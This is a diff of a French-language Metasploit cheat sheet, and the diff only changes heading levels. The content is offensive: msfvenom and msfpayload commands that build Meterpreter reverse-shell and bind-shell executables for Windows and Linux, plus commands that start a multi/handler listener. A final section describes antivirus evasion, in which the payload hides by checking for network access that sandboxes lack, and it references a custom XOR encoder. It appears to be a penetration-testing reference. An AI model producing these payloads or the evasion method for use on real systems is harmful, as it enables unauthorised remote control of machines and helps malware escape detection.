@@ -1,6 +1,6 @@
-﻿#Metasploit#
-##Genération de payload exécutables##
-###Manuel###
+##Metasploit##
+###Genération de payload exécutables###
+####Manuel####
 ~~~~~~~
 # msfvenom -h
 Usage: /opt/framework/msf3/msfvenom [options] 
@@ -22,35 +22,35 @@ Options:
     -h, --help                       Show this message
 ~~~~~~~
 
-###Exemple###
-####Lister les options d'un payload####
+####Exemple####
+#####Lister les options d'un payload#####
 ~~~~~~~
 # msfvenom -p windows/meterpreter/reverse_tcp -o
 ~~~~~~~
 
-####Créer un payload meterpreter pour windows####
+#####Créer un payload meterpreter pour windows#####
 ~~~~~~~
 # msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 > windobReverseMeterpreter5555.exe
 ~~~~~~~
 
-####Créer un payload meterpreter pour Linux####
+#####Créer un payload meterpreter pour Linux#####
 ~~~~~~~
 # msfvenom -p linux/x86/meterpreter/bind_tcp -f elf LPORT=5555 > linuxMeterpreter5555.bin
 ~~~~~~~
 
 
 
-###Alternative###
+####Alternative####
 ~~~~~~~
 # msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X > met-reverse.exe
 ~~~~~~~
 
-##Lancement de handler##
+###Lancement de handler###
 ~~~~~~~
 # msfcli multi/handler LPORT=5555 E
 ~~~~~~~
 
-##Exploitation depuis msfconsole##
+###Exploitation depuis msfconsole###
 Cette méthode evite de charger deux fois le gros de metasploit.
 
 ~~~~~~~
@@ -67,7 +67,7 @@ set LPORT 8888
 exploit
 ~~~~~~~
 
-## Contournement des antivirus##
+### Contournement des antivirus###
 Certains virus utilisent des sandboxes pour lancer les exécutables et vérifier leur dangerosité. (Mal)heureusement, ces sandboxes implémentent rarement les communication réseaux, pour des raisons de sécurités.
 
 Il est donc possible de cacher un payload malveillant en vérifiant la possibilité d'effectuer une connexion réseau. En utilisant le template [ci-joint](../ressources/Tools/metasploit/meterpreterTemplate1.zip) et l'encoder metasploit [ci-joint](../ressources/Tools/metasploit/xorbyte.rb) à placer dans modules/encoders/x86/xorbyte.rb.
